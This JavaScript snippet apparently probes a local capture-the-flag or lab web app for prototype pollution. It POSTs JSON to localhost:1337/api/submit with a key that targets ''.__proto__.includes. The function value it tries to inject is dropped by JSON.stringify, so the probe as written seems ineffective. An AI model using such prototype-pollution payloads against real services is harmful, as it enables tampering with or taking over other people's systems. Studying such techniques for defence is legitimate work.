(()=>{
	console.clear();

	let data = {
		"artist.name": "Haigh",
        "''.__proto__.includes": () => {
            console.log("<String>.includes");
            return false;
        }
	};

	fetch("http://localhost:1337/api/submit", {
	  "headers": {
		"content-type": "application/json"
	  },
	  "body": JSON.stringify(data),
	  "method": "POST"
	}).then(
		r => r.text()
	).then(console.log);
})();